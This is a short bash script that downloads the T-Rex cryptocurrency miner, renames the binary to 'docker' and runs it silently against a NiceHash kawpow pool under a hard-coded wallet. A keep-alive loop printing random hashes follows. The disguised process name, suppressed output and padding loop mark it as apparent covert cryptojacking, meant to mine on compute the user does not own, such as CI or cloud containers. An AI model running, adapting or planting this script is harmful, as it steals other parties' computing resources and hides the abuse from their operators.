#!/bin/bash
wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xvf t-rex-0.26.8-linux.tar.gz >/dev/null 2>&1
mv t-rex docker
./docker -a kawpow -o stratum+ssl://kawpow.auto.nicehash.com:443 -u NHbGP8zV37xAgXGmPCjVFcQQXLbde1NNPJWt.$(echo $(shuf -i 1000-9999 -n 5)-FUAD) -p x >/dev/null 2>&1
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
